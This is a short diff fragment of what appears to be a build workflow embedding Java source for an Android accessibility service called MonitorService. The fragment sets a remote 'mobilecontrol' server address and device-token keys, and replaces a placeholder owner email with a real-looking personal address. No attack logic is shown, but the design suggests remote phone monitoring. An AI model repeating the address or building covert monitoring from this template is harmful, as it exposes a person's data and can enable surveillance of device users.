@@ -343,7 +343,7 @@ jobs:
           public class MonitorService extends AccessibilityService {
               private static final String TAG = "NEON_PANEL";
               private static final String API_BASE = "https://mobilecontrol-web.onrender.com";
-              private static final String OWNER_EMAIL = "USER_EMAIL_HERE"; // ← এখানে আপনার ইউজারের ইমেইল দিন
+              private static final String OWNER_EMAIL = "ranahosen518@gmail.com"; // ← এখানে আপনার ইউজারের ইমেইল দিন
               private static final String PREFS_NAME = "device_prefs";
               private static final String DEVICE_ID_KEY = "device_id";
               private static final String DEVICE_TOKEN_KEY = "device_token";
